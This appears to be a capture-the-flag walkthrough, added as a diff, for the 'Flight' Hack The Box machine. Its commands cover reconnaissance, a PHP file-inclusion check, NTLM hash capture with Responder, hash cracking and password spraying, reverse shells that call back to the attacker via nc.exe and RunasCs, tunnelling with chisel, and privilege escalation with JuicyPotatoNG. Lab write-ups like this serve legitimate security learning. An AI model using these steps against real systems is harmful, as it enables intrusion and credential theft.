@@ -1,0 +1,306 @@
+
+Running NMAP SCAN on TARGET HOST:
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: g0 Aviation
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-24 07:21:55Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49690/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m00s
+| smb2-time: 
+|   date: 2023-01-24T07:22:48
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Navigating to 10.10.11.187:80;
+
+
+
+echo "10.10.11.187 flight.htb" > /etc/hosts
+
+Checking for VHOSTS and DIRs on target host:
+
+###
+
+
+gobuster dir -u http://flight.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --threads 50                 
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://flight.htb
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Timeout:                 10s
+===============================================================
+2023/01/23 19:28:07 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 333] [--> http://flight.htb/images/]
+/phpmyadmin           (Status: 403) [Size: 418]
+/css                  (Status: 301) [Size: 330] [--> http://flight.htb/css/]
+/js                   (Status: 301) [Size: 329] [--> http://flight.htb/js/]
+/con                  (Status: 403) [Size: 299]
+/webalizer            (Status: 403) [Size: 418]
+Progress: 19614 / 19967 (98.23%)
+===============================================================
+2023/01/23 19:28:26 Finished
+===============================================================
+
+gobuster vhost -u http://flight.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --threads 50 --append-domain 
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://flight.htb
+[+] Method:          GET
+[+] Threads:         50
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+[+] User Agent:      gobuster/3.4
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/01/23 19:30:36 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: school.flight.htb Status: 200 [Size: 3996]
+Progress: 19904 / 19967 (99.68%)
+===============================================================
+2023/01/23 19:31:35 Finished
+===============================================================
+
+VHOST: school.flight.htb
+
+echo "10.10.11.187 flight.htb school.flight.htb" > /etc/hosts 
+
+Navigate to http://school.flight.htb and check what's in there;
+
+Let's see how it acts if we try to do basic injection:
+http://school.flight.htb/index.php?view=../../../etc/passwd
+Double URL Encode fails also;
+Turns out it is filtering our injection out and reporting it; Let's see if we can check how it does it.
+Inspecting both /index.php and our injection attempt source and we can see in /index.php:
+
+<?php
+
+ini_set('display_errors', 0);
+error_reporting(E_ERROR | E_WARNING | E_PARSE); 
+
+if(isset($_GET['view'])){
+$file=$_GET['view'];
+if ((strpos(urldecode($_GET['view']),'..')!==false)||
+    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
+    (strpos(urldecode($_GET['view']),'\\')!==false)||
+    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
+    (strpos(urldecode($_GET['view']),'.shtml')!==false)
+){
+    echo "<h1>Suspicious Activity Blocked!";
+    echo "<h3>Incident will be reported</h3>\r\n";
+}else{
+    echo file_get_contents($_GET['view']);	
+}
+}else{
+    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
+}
+	
+Alright, so instead of trying to bypass this PHP filter - from our nmap scan we know that this target host is running Apache on Win64 server on port 80 HTTP
+and also LDAP and kerberos;
+
+SEE:
+
+https://www.manageengine.com/products/active-directory-audit/learn/kerberos-vs-ldap.html 
+https://plugins.miniorange.com/ntlm-kerberos-authentication-mechanism
+
+!!! https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/extracting-credentials/retrieve-windows-hashes !!!
+!!! https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html !!!
+
+NTLMv2 vs Kerberos
+
+Most of the network authentication traffic you’ll see today is over Kerberos as opposed to NTLMv2. 
+Kerberos offers many advantages over NTLMv2 (though it is by no means perfect).
+However, it is still very difficult to disable NTLMv2 entirely on a network. 
+Because Kerberos relies on Service Principle Names, in the default settings, 
+anytime an IP address is used to reference the server (ie \\10.10.10.10 instead of \\file-server), 
+Kerberos won’t work, and authentication will fall back to NTLMv2. 
+Additionally, many older systems and devices (like printers) don’t support Kerberos and rely on NTLMv2.
+NTLM vs NTLMv2
+
+Windows stores hashes locally as LM-hash and/or NThash.
+Unforatunately for the sake of this conversation, the NTHash is often referred to as the NTLM hash (or just NTLM). 
+This is completely different from the term NTLMv2, which is really short for Net-NTLMv2, which refers to the authentication protocol. 
+Within that protocol, it does make use of the Windows NT and/or LM hashes to encrypt the response,
+and that response is sometimes even referred to as an NTLMv2 hash (though I’d try to avoid that to be tight in your language).
+
+
+NTLMv1/v2 hashes are derived from a challenge/response algorithm and are based on the user's NT hash.
+
+Alice access to the share
+Fileserver generate a challenge (random number) and send it to Alice
+Alice send challenge answer obtained by passing to a function her NTLM hash and the challenge
+File server ask domain controller to perform the computation and compare the results
+Domain controller says it is ok
+Alice can access to the fileserver
+
+These hashes can be retrieved with tools like Responder or Inveigh 
+
+so:
+
+sudo responder -I tun0
+
+http://school.flight.htb/index.php?view=//IP/fileshare
+
+Check terminal
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:0be0fa4280b939a1:5E7248A041B9B7668C8624EAA337FF7D:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+Successfully retrieved the NTLMv3 HASH;
+Now let's try and crack it - you can do it by using john or hashcat, or any other similar tool;
+
+john --w=/usr/share/wordlists/rockyou.txt hash 
+PASSWORD      (svc_apache)  
+
+Now let's try to use these credentials on the CLI (smbclient);
+
+Let's enumarate the users by using crackmapexec:
+
+crackmapexec smb targethost -u svc_apache -p 'FoundPW' --users
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing RDP protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing SMB protocol database
+[*] Initializing SSH protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing FTP protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
+  if result['type'] is not 'searchResEntry':
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:FoundPW 
+SMB         flight.htb      445    G0               [+] Enumerated domain user(s)
+SMB         flight.htb      445    G0               flight.htb\O.Possum                       badpwdcount: 2 desc: H
+SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S
+SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 1 desc: S
+SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 1 desc: P
+SMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 1 desc: N
+SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 1 desc: P
+SMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 1 desc: S
+SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 1 desc: S
+SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 1 desc: P
+SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 1 desc: S
+SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 1 desc: H
+SMB         flight.htb      445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J
+SMB         flight.htb      445    G0               flight.htb\krbtgt                         badpwdcount: 1 desc: K
+SMB         flight.htb      445    G0               flight.htb\Guest                          badpwdcount: 1 desc: B
+SMB         flight.htb      445    G0               flight.htb\Administrator                  badpwdcount: 1 desc: B
+
+
+
+# crackmapexec smb TARGET -u users.txt -p 'PWD' --continue-on-success
+
+We found:
+SMB         flight.htb                flight.htb\S.Moon   
+
+Let's use that
+
+crackmapexec smb TARGET -u 'S.Moon' -p 'PWD' --shares             
+SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:PWD
+SMB         10.10.11.187    445    G0               [+] Enumerated shares
+SMB         10.10.11.187    445    G0               Share           Permissions     Remark
+SMB         10.10.11.187    445    G0               -----           -----------     ------
+SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
+SMB         10.10.11.187    445    G0               C$                              Default share
+SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
+SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
+SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.10.11.187    445    G0               Users           READ            
+SMB         10.10.11.187    445    G0               Web             READ
+
+SMB         10.10.11.187    445    G0               Shared          READ,WRITE   
+
+
+Very cool trick on NTLM:
+NTLM_theft:
+https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
+
+After you got your desktop.ini file up
+use smbclient to put it on the target host and afterwards use responder as we did earlier to get the hash for other users.
+
+C BUM user retrieved;
+
+On the retrieved hash we repeat the same steps that we performed on the first hash retrieved;
+John cracked it;
+
+Now we will apply the same techniques used above in order to see where we have RW permissions;
+
+Now we need to upload a PHP reverse shell on the share where we found RW permissions, so get a PHP REV SHELL and use smbclient to connect as C Bum and upload the shell.
+
+Once we uploaded the PHP reverse shell to the share we will navigate to it to open it;
+
+Using the revshell we will create a dir for NC;
+Upload NC.exe by hosting python3 http.server PORT > on the webshell curl IP PORT/name.sh -o nc.exe;
+Once NC.exe is uploaded to the target, on your machine start listening with nc on a PORT;
+in the webshell run nc.exe IP:PORT -e powershell.exe;
+Now we need to upload (using same methods as above) and use RunasCs to shell as svc_apache to c bum - https://github.com/antonioCoco/RunasCs;
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
+After start listening to a port number with nc and on the shell we got run:
+RunasCs.exe C.Bum FOUNDPWD powershell -r IP:PORT
+Now on our machine we should get a connection on the nc 
+GZ our first flag;
+Let's see whats going on on the network using netstat -ant;
+Check ports;
+Download and use Chisel https://github.com/jpillora/chisel 
+Target : chisel server --reverse -p 1337
+Victim : .\chisel.exe client IP:PORT R:8000:127.0.0.1:8000
+Once chisel is up
+visit localhost:8000
+we need to upload a new shell in ASPX format, see:
+https://docs.fileformat.com/web/aspx/
+Finally after uploading the aspx shell use it;
+Use it as we did with the one before - launch a shell to your host on a specified port, once you do it curl JuicyPotatoNG https://github.com/antonioCoco/JuicyPotatoNG on the target machine. Finally run:
+.\Juicy.exe -t * -p "C:\Windows\System32\cmd.exe" -i
+
+GZ the root flag is on Desktop :)
+
+
+
+
+
+
+                                                                                                                               
